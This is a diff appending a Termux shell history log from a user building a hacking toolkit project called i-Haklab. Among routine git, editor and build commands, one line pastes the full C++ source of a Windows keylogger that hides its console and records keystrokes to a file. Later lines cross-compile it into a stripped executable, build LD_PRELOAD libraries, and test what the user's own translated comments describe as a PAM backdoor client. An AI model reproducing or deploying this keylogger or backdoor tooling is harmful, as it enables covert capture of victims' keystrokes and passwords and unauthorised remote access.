@@ -8506,3 +8506,637 @@ dumpsys package $PKG | grep signature
 : 1718824860:0;cd i-Haklab
 : 1718824921:0;nvim include/below_zero.h
 : 1718826513:0;git add --all
+: 1718826537:0;git commit -m "..."
+: 1718826545:0;git push
+: 1718826704:0;ping -c 8 8.8.8.8
+: 1718827586:0;cd i-Haklab
+: 1718827595:0;nvim main-haklab.cpp
+: 1718827724:0;man i-haklab
+: 1718827784:0;../
+: 1718827801:0;cd i-Haklab
+: 1718827820:0;la
+: 1718827825:0;ls -al
+: 1718827840:0;tree .github
+: 1718827856:0;cat .github/workflows/i-haklab_build.yml
+: 1718836010:0;cd i-Haklab
+: 1718836024:0;nvim include/below_zero.h
+: 1718836519:0;bat main-haklab.cpp
+: 1718836616:0;ls src
+: 1718836624:0;cd src
+: 1718836633:0;cat ExecHaklab.cpp
+: 1718836642:0;rm ExecHaklab.cpp
+: 1718836648:0;bat NetworHaklab.cpp
+: 1718836781:0;bat RedTeamHaklab.cpp
+: 1718836895:0;../
+: 1718836912:0;bash ./build_sh.sh
+: 1718836945:0;nvim src/CMakeLists.txt
+: 1718836965:0;bash ./build_sh.sh
+: 1718860925:0;cd i-Haklab
+: 1718860928:0;git push
+: 1718860951:0;git branch
+: 1718865522:0;nvim i-Haklab/src/below_zero.cpp
+: 1718865601:0;nvim i-Haklab/include/below_zero.h
+: 1718865748:0;nvim i-Haklab/src/below_zero.cpp
+: 1718928892:0;mkdir keyloger_win
+: 1718928897:0;cd keyloger_win
+: 1718928919:0;nvim keyloger_wib.md
+: 1718932135:0;bat keyloger_win/keyloger_wib.md
+: 1718932851:0;cd keyloger_win
+: 1718932855:0;nvim keyloger_wib.md
+: 1718943287:0;cd keyloger_win
+: 1718943294:0;bat keyloger_wib.md
+: 1718943301:0;cat keyloger_wib.md
+: 1718944578:0;Cygwin
+: 1718944583:0;cygwin
+: 1718944825:0;mingw
+: 1718944843:0;mingw-w64
+: 1718944858:0;apt show min*
+: 1718944863:0;apt --help
+: 1718944876:0;apt search min
+: 1718944902:0;apt search min*
+: 1718944905:0;apt search min
+: 1718944927:0;apt list | grep min*
+: 1718944933:0;apt list | grep 64
+: 1718949578:0;sudo apt-get install mingw-w64\
+
+: 1718949586:0;apt install mingw-w64\
+
+: 1718949602:0;apt list | grep 64
+: 1718949625:0;apt list | grep 32
+: 1718949653:0;apt install llvm-mingw-w64
+: 1718949789:0;cd keyloger_win
+: 1718949796:0;rm keyloger_wib.md
+: 1718949813:0;nvim #include <iostream>\
+#include <fstream>\
+#include <Windows.h>\
+\
+using namespace std;\
+\
+class Keylogger {\
+private:\
+    ofstream logfile;\
+public:\
+    Keylogger(const string& filename) {\
+        logfile.open(filename, ios::out | ios::app);\
+        if (!logfile.is_open()) {\
+           // cerr << "Error al abrir el archivo de registro." << endl;\
+            exit(1);\
+        }\
+        // Ocultar la consola\
+        HWND hWnd = GetConsoleWindow();\
+        ShowWindow(hWnd, SW_HIDE);\
+    }\
+\
+    void startLogging() {\
+        char key;\
+        while (true) {\
+            Sleep(10); // Pequeño delay para no saturar el CPU\
+            for (int i = 8; i <= 255; ++i) {\
+                if (GetAsyncKeyState(i) & 0x8001 ) {\
+                    key = MapVirtualKey(i, MAPVK_VK_TO_CHAR);\
+                    if (key != 0) {\
+                        logfile << key;\
+                    }\
+                }\
+            }\
+        }\
+    }\
+\
+    ~Keylogger() {\
+        if (logfile.is_open()) {\
+            logfile.close();\
+        }\
+    }\
+};\
+\
+int main() {\
+    Keylogger keylogger("log.txt");\
+    keylogger.startLogging();\
+    return 0;\
+
+: 1718949820:0;nvim key.cpp
+: 1718949943:0;try with --fix-missing
+: 1718949966:0;apt
+: 1718950381:0;wine
+: 1718950402:0;apt instala llvm-mingw-w64
+: 1718950411:0;apt install llvm-mingw-w64
+: 1718950424:0;apt-get update
+: 1718950430:0;apt install llvm-mingw-w64
+: 1718950497:0;llvm-mingw-w64
+: 1718950531:0;apt remove llvm-mingw-w64
+: 1718969831:0;apt install mingw-w64
+: 1718969848:0;mingw-w64
+: 1718970091:0;x86_64-w64-mingw32-g++
+: 1718970122:0;apt install llvm-mingw-w64
+: 1718970129:0;x86_64-w64-mingw32-g++
+: 1718970143:0;x86_64-w64-mingw32-g++ --help
+: 1718970151:0;clang
+: 1718970250:0;x86_64-w64-mingw32-winder
+: 1718970264:0;x86_64-w64-mingw32-windres
+: 1718970285:0;rm p v
+: 1718970306:0;mv keyloger_win c++
+: 1718970314:0;cd c++
+: 1718971120:0;echo Obsidian | base64
+: 1718971393:0;trans :es -b "Carriage Return"
+: 1718989804:0;x86_64-w64-mingw32-g++
+: 1718994556:0;bat p.cpp
+: 1718994563:0;rm p.cpp
+: 1718994574:0;bat Actyvi-directory.md
+: 1719011722:0;nvim hex.cpp
+: 1719011995:0;clang++ hex.cpp -o hex
+: 1719012007:0;./hex
+: 1719012017:0;nvim hex
+: 1719012022:0;nvim hex.cpp
+: 1719012058:0;clang++ hex.cpp -o hex
+: 1719012066:0;./hex
+: 1719012249:0;clang++ hex.cpp -o hex
+: 1719012256:0;./hex
+: 1719012340:0;clang++ hex.cpp -o hex
+: 1719012347:0;./hex
+: 1719030840:0;cd i-Haklab
+: 1719030969:0;nvim .deb/i-haklab/home/.local/etc/i-Haklab/Tools/Readme/C/clang++.md
+: 1719031040:0;git status
+: 1719031330:0;cd c++/keyloger_win
+: 1719031347:0;mv key.cpp keylogger.cpp
+: 1719031352:0;nvim keylogger.cpp
+: 1719031417:0;clang++ -o keylogger keylogger.cpp -lws2_32
+: 1719031435:0;clang++ -o keylogger keylogger.cpp -lws2_32 keylogger.exe
+: 1719031453:0;gcc++ -o keylogger keylogger.cpp -lws2_32 keylogger.exe
+: 1719031465:0;g++ -o keylogger keylogger.cpp -lws2_32 keylogger.exe
+: 1719031578:0;bat keylogger.cpp
+: 1719033241:0;x86_64-w64-mingw32-g++ -o keylogger.exe keylogger.cpp
+: 1719033260:0;apt reinstall mingw-w64
+: 1719033287:0;apt reinstall llvm-mingw-w64
+: 1719033294:0;x86_64-w64-mingw32-g++ -o keylogger.exe keylogger.cpp
+: 1719033312:0;x86_64-w64-mingw32-gcc -o keylogger.exe keylogger.cpp
+: 1719033528:0;cd victorh028.github.io
+: 1719033541:0;cd _posts
+: 1719033559:0;bat 2024-04-22-ShellCodes.md
+: 1719033566:0;cat 2024-04-22-ShellCodes.md
+: 1719033571:0;rm 2024-04-22-ShellCodes.md
+: 1719033595:0;../
+: 1719033602:0;git add --all
+: 1719033613:0;git commit -m "..."
+: 1719033636:0;git push
+: 1719033649:0;git
+: 1719033662:0;git cstatys
+: 1719033667:0;git status
+: 1719034499:0;cd c++/
+: 1719034504:0;cd keyloger_win
+: 1719034507:0;x86_64-w64-mingw32-g++
+: 1719034589:0;which clang
+: 1719034624:0;cd /data/data/com.termux/files/usr/opt/llvm-mingw-w64/bin/
+: 1719034637:0;.
+: 1719034643:0;ls -al clang
+: 1719034650:0;clang
+: 1719034667:0;x86_64-w64-mingw32-g++
+: 1719034700:0;ln
+: 1719034725:0;ln -s /data/data/com.termux/files/usr/bin/clang
+: 1719034732:0;rm clang
+: 1719034735:0;ln -s /data/data/com.termux/files/usr/bin/clang
+: 1719034739:0;x86_64-w64-mingw32-g++
+: 1719034762:0;cd c++/keyloger_win
+: 1719034785:0;x86_64-w64-mingw32-gcc -o keylogger.exe keylogger.cpp
+: 1719034875:0;x86_64-w64-mingw32-g++ -O2 keylogger.cpp -o keylog.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+: 1719034947:0;locate mingw-w6
+: 1719034973:0;find &PREFIX -iname mingw-w64
+: 1719034982:0;find $PREFIX -iname mingw-w64
+: 1719035002:0;find $PREFIX -iname "mingw-w64"
+: 1719035033:0;find $PREFIX -iname "ls"
+: 1719035042:0;find $PREFIX -iname "include"
+: 1719035113:0;x86_64-w64-mingw32-g++ -O2 keylogger.cpp -o keylog.exe -I/data/data/com.termux/files/usr/opt/llvm-mingw-w64/aarch64-w64-mingw32/include -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+: 1719035397:0;trans :en -b "Cómo creo un ejecutable de Windows en Termux "
+: 1719036429:0;cd c++
+: 1719036466:0;nvim MessageBox.cpp
+: 1719036499:0;x86_64-w64-mingw32-gcc -o programa.exe MessageBox.cpp -luser32\
+
+: 1719036631:0;pkg install clang\
+pkg install binutils\
+pkg install mingw-w64\
+
+: 1719036933:0;x86_64-w64-mingw32-gcc -o programa.exe MessageBox.cpp -luser32\
+
+: 1719036976:0;cd keyloger_win
+: 1719036989:0;x86_64-w64-mingw32-g++ -O2 keylogger.cpp -o keylog.exe -I/data/data/com.termux/files/usr/opt/llvm-mingw-w64/aarch64-w64-mingw32/include -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+: 1719037134:0;pkg install clang\
+pkg install binutils\
+pkg install mingw-w64\
+../
+: 1719037142:0;../
+: 1719037150:0;nvim MessageBox.cpp
+: 1719056618:0;rm hex
+: 1719056622:0;cd c++
+: 1719056678:0;mv programa.exe $HOME/storage/downloads
+: 1719056686:0;cd keyloger_win
+: 1719056715:0;mv keylog.exe $HOME/storage/downloads
+: 1719068408:0;cd c++/keyloger_win
+: 1719068421:0;x86_64-w64-mingw32-g++ -O2 keylogger.cpp -o keylog.exe -I/data/data/com.termux/files/usr/opt/llvm-mingw-w64/aarch64-w64-mingw32/include -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+: 1719068446:0;file keylog.exe
+: 1719068655:0;clesr
+: 1719068659:0;clear
+: 1719068704:0;trans :es -b "Gracias a todos  por sus respuesta "
+: 1719068713:0;trans :en -b "Gracias a todos  por sus respuesta "
+: 1719069113:0;trans :en -b "Alguna recomendacion en partucular para crear un shell_code de mi keylogger"
+: 1719070459:0;trans :en -b "Hay tutorial de esta escalada de privilegio en termux"
+: 1719077311:0;i-haklab --about t
+: 1719077320:0;i-haklab --about p
+: 1719077344:0;i-haklab --about pdftotest
+: 1719114590:0;nvim mien.cpp
+: 1719114650:0;clang++ -o mien mien.cpp
+: 1719114657:0;./mien
+: 1719114687:0;clang++ -o mien mien.cpp
+: 1719114691:0;./mien
+: 1719114709:0;rm mien mien.cpp
+: 1719159869:0;i-haklab --about find
+: 1719159905:0;find ./i-Haklab -iname find
+: 1719159917:0;find ./i-Haklab -iname nmap
+: 1719159928:0;find ./i-Haklab -iname find
+: 1719160067:0;os
+: 1719160082:0;cd /i-Haklab/.deb/i-haklab/home/.local/etc/i-Haklab/Tools/Readme
+: 1719160090:0;cd /i-Haklab/.deb/i-haklab/home/.local/etc/i-Haklab/Tools/
+: 1719160104:0;cd ./i-Haklab/.deb/i-haklab/home/.local/etc/i-Haklab/Tools/
+: 1719160109:0;cd Readme
+: 1719160139:0;ls metadatos
+: 1719160150:0;ls E
+: 1719160170:0;mv metadatos/exiftool.md E
+: 1719160175:0;ls metadatos
+: 1719160184:0;rm -d metadatos
+: 1719160202:0;ls F/find.md
+: 1719160213:0;nvim F/find.md
+: 1719164897:0;find ./i-Haklab -iname W*
+: 1719164915:0;find ./i-Haklab -iname *.md*
+: 1719202071:0;nvin Ipscan.cpp
+: 1719202084:0;nvim Ipscan.cpp
+: 1719202168:0;clang++ -o Ipscan Ipscan.cpp
+: 1719202188:0;./Ipscan
+: 1719202304:0;rm Ipscan
+: 1719202314:0;mv Ipscan.cpp c++
+: 1719202380:0;nvim hex.cpp
+: 1719202439:0;clang++ -o hex hex.cpp
+: 1719202445:0;./hex
+: 1719202488:0;nvim hex
+: 1719202494:0;nvim hex.cpp
+: 1719202517:0;clang++ -o hex hex.cpp
+: 1719202527:0;./hex
+: 1719202551:0;bat hex.cpp
+: 1719202873:0;nvin dowload.cpp
+: 1719202881:0;nvim download.cpp
+: 1719203399:0;i-haklab --about git
+: 1719204145:0;i-haklab --about nmap
+: 1719204159:0;nmap
+: 1719204169:0;nmap -sP 127.0.0.1
+: 1719204288:0;nmap -sP 127.0.0.1/24
+: 1719204344:0;nmap
+: 1719273206:0;cd i-Haklab
+: 1719273217:0;bat main-haklab.cpp
+: 1719273456:0;bat notas.md
+: 1719273594:0;nvim include/below_zero.h
+: 1719274196:0;nvim main-haklab.cpp
+: 1719274227:0;bat build_sh.sh
+: 1719274236:0;bash build_sh.sh
+: 1719274366:0;nvim main-haklab.cpp
+: 1719274387:0;nvim src/below_zero.cpp
+: 1719285180:0;cd i1
+: 1719285182:0;cd i-Haklab
+: 1719285193:0;bat notas.md
+: 1719285260:0;termux-url-open https://theboostcpplibraries.com/boost.program_options
+: 1719288934:0;clear
+: 1719288943:0;cd victorh028.github.io
+: 1719288958:0;cd _posts
+: 1719288997:0;mv 2024-01-06-markdown.md 2023-04-20-GIT.md $HOME/
+: 1719289014:0;mv 2023-10-10-desktop-linux.md $HOME/
+: 1719289027:0;cd victorh028.github.io
+: 1719289031:0;git add
+: 1719289041:0;git add --all
+: 1719289060:0;git commit -m "Removiendo"
+: 1719289065:0;git push
+: 1719289071:0;clear
+: 1719289493:0;mkdir Notas
+: 1719289518:0;mv 2*.md Notas
+: 1719289530:0;ls notas
+: 1719289540:0;rm notas
+: 1719289544:0;rm notas -rd
+: 1719289551:0;rm hex
+: 1719289580:0;cd victorh028.github.io
+: 1719289598:0;bat notas.md
+: 1719289625:0;ls assets
+: 1719289630:0;ls assets/images
+: 1719289648:0;ls assets/images/alpine
+: 1719289660:0;file assets/images/alpine/alpine-logo.png
+: 1719289715:0;rm assets/images/GIT -drf
+: 1719289736:0;rm assets/images/i-haklab -rf
+: 1719289756:0;fil assets/images/localtunnel/icon-localtunnel.png
+: 1719289764:0;fila assets/images/localtunnel/icon-localtunnel.png
+: 1719289771:0;file assets/images/localtunnel/icon-localtunnel.png
+: 1719289797:0;ls assets/images
+: 1719289822:0;s
+: 1719290091:0;cd /storage/
+: 1719290098:0;df
+: 1719290126:0;cd /storage/9016-4EF8
+: 1719290142:0;cd Download/TermuxD
+: 1719290143:0;ks
+: 1719290151:0;cd Hak
+: 1719290183:0;ln -s /storage/9016-4EF8/Download/TermuxD/Hak
+: 1719290188:0;cd Hak
+: 1719290198:0;bat AllC++.md
+: 1719290278:0;cd Hak
+: 1719290313:0;ln -s $HOME/hex.cpp
+: 1719451925:0;cd i-Haklab
+: 1719451960:0;bat notas.md
+: 1719452015:0;rm Hak
+: 1719452022:0;rm hex.cpp
+: 1719452023:0;os
+: 1719452032:0;cd c++
+: 1719452047:0;rm *.ouy
+: 1719452049:0;rm *.ouyt
+: 1719452051:0;rm *.out
+: 1719452052:0;os
+: 1719452072:0;rm anime cin print simple typedef-enum
+: 1719452093:0;nvim 1.cpp
+: 1719452320:0;clang++ -o 1 1.cpp && ./1
+: 1719452377:0;rm 1
+: 1719452392:0;rm 1.cpp
+: 1719452404:0;nvim 1.c
+: 1719452635:0;clang++ -o 1 1.c && ./1
+: 1719452715:0;mv 1.c pnt_funcion.c
+: 1719521979:0;clesr
+: 1719521983:0;clear
+: 1719521999:0;ls CTF
+: 1719522006:0;ls CTF/WEP
+: 1719522024:0;ls Notas
+: 1719522065:0;nvim l.cpp
+: 1719522848:0;clang++ -o l l.cpp && ./l && rm l
+: 1719522859:0;clang++ -o l l.cpp && ./l
+: 1719544476:0;trans -b :es "Server Update in progress. Please come back soon"
+: 1719617971:0;nvim l.cpp
+: 1719618063:0;clang++ -o l l.cpp
+: 1719618069:0;./l
+: 1719618084:0;rm l.cpp
+: 1719618090:0;rm l
+: 1719618101:0;cd c++/
+: 1719618117:0;nvim maw_c.c
+: 1719618771:0;nvim c++/maw_c.c
+: 1719619649:0;man dlsym
+: 1719619653:0;man dlsym(1)
+: 1719619662:0;man dlsym
+: 1719619945:0;nvim c++/maw_c.c
+: 1719625301:0;fg
+: 1719625304:0;nvim c++/maw_c.c
+: 1719627079:0;\
+� gcc -c -Wall -Werror -fpic mylibrary.c\
+�
+: 1719627087:0;\
+� gcc -c -Wall -Werror -fpic maw.c
+: 1719627095:0;gcc -c -Wall -Werror -fpic maw.c
+: 1719627137:0;nvim maw.c
+: 1719627165:0;gcc -c -Wall -Werror -fpic maw.c
+: 1719627382:0;bat read_syscall.cpp
+: 1719627421:0;bat ihaklab\ \(1\).cpp
+: 1719627460:0;nvim maw.c
+: 1719627493:0;clang-format -i maw.c
+: 1719627496:0;nvim maw.c
+: 1719627936:0;bat downloads/ihaklab\ \(1\).cpp
+: 1719628663:0;gcc -c -Wall -Werror -fpic maw.c
+: 1719628672:0;nvim maw.c
+: 1719628954:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o ihaklab.so -ldl -Wall
+: 1719628985:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719628999:0;rm ihaklab.so
+: 1719629062:0;mv maw.c $PREFIX/lib/
+: 1719629068:0;Hola
+: 1719629113:0;mv maw.ci $PREFIX/lib/
+: 1719629118:0;mv maw.cii $PREFIX/lib/
+: 1719629166:0;mv $PREFIX/lib/maw.c $HOME
+: 1719629182:0;mv maw.so $PREFIX/lib/
+: 1719629197:0;mv maw_c.so $PREFIX/lib/
+: 1719629201:0;Hola
+: 1719629210:0;bat maw.c
+: 1719629226:0;"Hola"
+: 1719629231:0;Hola
+: 1719629303:0;rm $PREFIX/lib/maw_c.so
+: 1719629305:0;exir
+: 1719629990:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719630061:0;rm $PREFIX/lib/maw_c.so
+: 1719630105:0;export LD_PRELOAD=$LD_PRELOAD:/data/data/com.termux/files/home/maw_c.so
+: 1719630126:0;echo $LD_PRELOAD
+: 1719630133:0;Holq
+: 1719630136:0;Hola
+: 1719630287:0;export LD_PRELOAD=/data/data/com.termux/files/home/maw_c.so:$LD_PRELOAD
+: 1719630292:0;echo $LD_PRELOAD
+: 1719630301:0;Hola
+: 1719630475:0;echo $LD_PRELOAD
+: 1719890309:0;starse ls
+: 1719890321:0;starce ls
+: 1719890331:0;apt install strace
+: 1719890353:0;starce ls
+: 1719890364:0;strace l
+: 1719890367:0;strace ls
+: 1719891772:0;bat ihaklab.cpp
+: 1719891801:0;cat ihaklab.cpp
+: 1719892202:0;éi
+: 1719892221:0;export LD_PRELOAD=/data/data/com.termux/files/home/maw_c.so:$LD_PRELOAD
+: 1719892230:0;nvim maw.c
+: 1719892294:0;clang-format -i maw
+: 1719892297:0;clang-format -i maw.c
+: 1719892313:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719892321:0;Victor
+: 1719892337:0;vicot
+: 1719892357:0;victor
+: 1719892380:0;nvim maw.c
+: 1719892488:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719892493:0;victor
+: 1719892502:0;nvim maw.c
+: 1719892517:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719892529:0;victor
+: 1719892574:0;cat maw.c
+: 1719892960:0;nvim maw.c
+: 1719893092:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719893096:0;victor
+: 1719893114:0;nvim maw.c
+: 1719893190:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719893194:0;victor
+: 1719893247:0;which
+: 1719893250:0;which ls
+: 1719893256:0;which victor
+: 1719893284:0;nvim maw.c
+: 1719893347:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719893357:0;Demon
+: 1719893376:0;which Dwmon
+: 1719893386:0;which Demon
+: 1719893391:0;which lop
+: 1719893412:0;clear
+: 1719893422:0;clang++ -ldl maw.c -fPIC -shared -D_GNU_SOURCE -o maw_c.so -ldl -Wall
+: 1719893431:0;Demon
+: 1719893439:0;which Demon
+: 1719893449:0;ps -al
+: 1719894127:0;demon
+: 1719894132:0;Demon
+: 1719966260:0;trans :es -b " * You only need this if you're connecting via SSH to the PAM backdoor \
+ * LD_PRELOAD=./client.so ssh rootme@blah.blah\
+ * Otherwise set it in ncat if you're using plain text accept\
+ * or crypthook backdoor"
+: 1719966340:0;trans :es -b " * You only need this if you're connecting via SSH to the PAM backdoor \
+ "
+: 1719966406:0;trans :es -b "Otherwise set it in ncat if you're using plain text accept\
+ * or crypthook backdoor "
+: 1719966474:0;mkdir maw
+: 1719966486:0;mv maw.c maw
+: 1719966506:0;nvim client.c
+: 1719966560:0;clang++ -ldl client.c -fPIC -shared -D_GNU_SOURCE -o client.so -ldl -Wall
+: 1719966569:0;nvim client.c
+: 1719966581:0;clang++ -ldl client.c -fPIC -shared -D_GNU_SOURCE -o client.so -ldl -Wall
+: 1719966589:0;nvim client.c
+: 1719966910:0;gcc -fPIC client.c -shared -o client.so
+: 1719966924:0;gcc -ldl client.c -fPIC -shared -D_GNU_SOURCE -o client.so -ldl -Wall
+: 1719967066:0;export LD_PRELOAD=/data/data/com.termux/files/home/:$LD_PRELOAD
+: 1719967139:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1719967159:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1719967218:0;ncat 127.0.0.1:61061
+: 1719967261:0;i-hacklqb
+: 1719967270:0;i-haklab
+: 1719967286:0;cd i-Haklab
+: 1719967307:0;echo $LD_PRELOAD
+: 1719967402:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so ssh 127.0.0.1 -p 2222 :$LD_PRELOAD
+: 1719967423:0;export LD_PRELOAD="/data/data/com.termux/files/home/client.so ssh 127.0.0.1 -p 2222" :$LD_PRELOAD
+: 1719967599:0;echo $LD_PRELOAD
+: 1719967634:0;nc 127.0.0.1 61061
+: 1719967836:0;nmap 127.0.0.1 -p 61061
+: 1719967850:0;echo $LD_PRELOAD
+: 1719967904:0;export LD_PRELOAD="/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1719967918:0;export LD_PRELOAD="/data/data/com.termux/files/home/client.so$LD_PRELOAD
+: 1719967928:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1719967944:0;echo $LD_PRELOAD
+: 1719967958:0;nmap 127.0.0.1 -p 61061
+: 1719968180:0;LD_PRELOAD=./client.so ssh 127.0.0.1
+: 1719968194:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 2222
+: 1719968219:0;sshd -p 2222
+: 1719968229:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 2222
+: 1719968300:0;paswd sshd
+: 1719968308:0;passwd sshd
+: 1719968328:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 2222
+: 1719968374:0;nmap 127.0.0.1 -p 2222
+: 1719968384:0;nmap 127.0.0.1 -p 61061
+: 1719968409:0;echo $LD_PRELOAD
+: 1719968428:0;LD_PRELOAD=./client.so ssh 127.0.0.1
+: 1719968450:0;killp sshd
+: 1719968459:0;kill sshd
+: 1719968465:0;pkill sshd
+: 1719968486:0;nmap 127.0.0.1 -p 61061
+: 1719968496:0;LD_PRELOAD=./client.so ssh 127.0.0.1
+: 1719968508:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 2222
+: 1719968517:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 61061
+: 1719968564:0;ssh 127.0.0.1 -p 61061
+: 1719968592:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 61061
+: 1719968604:0;echo $LD_PRELOAD
+: 1719968615:0;ps
+: 1719968623:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 61061
+: 1719968641:0;LD_PRELOAD=./client.so ssh 127.0.0.1
+: 1719968659:0;ssh 127.0.0.1 -p 61061
+: 1719968673:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 61061
+: 1719968715:0;ssh 127.0.0.1 -p 61061
+: 1719968777:0;LD_PRELOAD=./client.so ssh 127.0.0.1:61061
+: 1719968787:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 61061
+: 1719968806:0;sshd -p 2222
+: 1719968817:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 2222
+: 1719968899:0;echo $LD_PRELOAD
+: 1719968940:0;ssh 127.0.0.1 -p 61061
+: 1719968960:0;LD_PRELOAD=./client.so ssh 127.0.0.1
+: 1719969035:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 61061
+: 1719969097:0;clesr
+: 1719969099:0;clear
+: 1719969104:0;bat client.
+: 1719969115:0;bat client.c
+: 1719969161:0;gcc -ldl client.c -fPIC -shared -D_GNU_SOURCE -o client.so -Wall
+: 1719969187:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1719969214:0;echo $LD_PRELOAD
+: 1719969245:0;LD_PRELOAD=./client.so ssh 127.0.0.1 -p 61061
+: 1719969323:0;bat client.c
+: 1719969328:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1719969342:0;gcc -ldl client.c -fPIC -shared -D_GNU_SOURCE -o client.so -Wall
+: 1719969351:0;bat client.c
+: 1719969355:0;gcc -ldl client.c -fPIC -shared -D_GNU_SOURCE -o client.so -Wall
+: 1719969359:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1719969385:0;ssh 127.0.0.1 -p 61061
+: 1720042815:0;i-h
+: 1720042821:0;cd i-Haklab
+: 1720042846:0;bash build_sh.sh
+: 1720042937:0;nvim include/below_zero.h
+: 1720043252:0;bash build_sh.sh
+: 1720043465:0;nvim include/below_zero.h
+: 1720043478:0;cd include
+: 1720043483:0;cd ../
+: 1720043493:0;bash build_sh.sh
+: 1720043914:0;i-haklab
+: 1720043918:0;i-haklab --help
+: 1720044978:0;cd .local/etc/i-Haklab/Tools/Readme
+: 1720044985:0;clear
+: 1720045640:0;bash build_sh.sh
+: 1720045776:0;bash build_sh.sh
+: 1720045814:0;cd .local/etc/i-Haklab/Tools/Readme
+: 1720045823:0;cd .local/etc/i-Haklab/Tools/Readme
+: 1720045857:0;i-haklab --about snow
+: 1720045908:0;mv snow snow.md
+: 1720045914:0;i-haklab --about snow
+: 1720045998:0;helix
+: 1720048178:0;exut
+: 1720059759:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1720059795:0;nc 192.168.1.10 61061
+: 1720059833:0;nc 127.0.0.1 61061
+: 1720059902:0;cat client.c
+: 1720060071:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD
+: 1720060096:0;nc 127.0.0.1 61061
+: 1720060255:0;nvim client_2.c
+: 1720060299:0;gcc -ldl client_2.c -fPIC -shared -D_GNU_SOURCE -o client.so -Wall\
+
+: 1720060375:0;nvim client_3.c
+: 1720060401:0;gcc -ldl client_3.c -fPIC -shared -D_GNU_SOURCE -o client.so -Wall\
+
+: 1720060411:0;export LD_PRELOAD=/data/data/com.termux/files/home/client.so:$LD_PRELOAD\
+
+: 1720060422:0;nc 127.0.0.1 61061\
+
+: 1720060429:0;ps
+: 1720060457:0;nmap 127.0.0.1 -p 61061
+: 1720060537:0;ping 127.0.0.1 -p 61061
+: 1720060602:0;ss
+: 1720060606:0;netcat
+: 1720060650:0;nc -l -p 61061
+: 1720060663:0;nc -p 61061
+: 1720060684:0;nc 127.0.0.1 61061\
+
+: 1720060693:0;ps
+: 1720060699:0;clear
+: 1720060723:0;echo $LD_PRELOAD
+: 1720060735:0;nvim client_4.c
+: 1720060753:0;gcc -ldl client_3.c -fPIC -shared -D_GNU_SOURCE -o client.so -Wall\
+
+: 1720060759:0;nc 127.0.0.1 61061\
+
+: 1720060777:0;nc -l -p 61061\
+
+: 1720060793:0;nc 127.0.0.1 61061\
+
+: 1720060869:0;LD_PRELOAD=./client.so nc -l -p 61061
+: 1720060910:0;gcc -ldl client.c -fPIC -shared -D_GNU_SOURCE -o client.so -Wall\
+
+: 1720060914:0;LD_PRELOAD=./client.so nc -l -p 61061
+: 1720060923:0;LD_PRELOAD=./client.so nc -l -p 61069
+: 1720060937:0;nc -l -p 61061\
+
+: 1720060957:0;LD_PRELOAD=./client.so nc 127.0.0.1 61061
+: 1720061021:0;nc -l -p 61061\
+
+: 1720061035:0;LD_PRELOAD=./client.so nc 127.0.0.1
+: 1720065145:0;cd i-Haklab
+: 1720065153:0;bat include/below_zero.h
+: 1720065170:0;bat src/below_zero.cpp
+: 1720065708:0;nvim src/below_zero.cpp
+: 1720067557:0;echo $SHELL
+: 1720067579:0;nvim src/below_zero.cpp
+: 1720068095:0;bash build_sh.sh
+: 1720068290:0;i-haklab --about nmap
+: 1720068308:0;i-haklab --about 9m
+: 1720068324:0;i-haklab --about lo
+: 1720068338:0;exiy
+: 1720068365:0;git staus
+: 1720068372:0;git status
+: 1720068391:0;git add --all
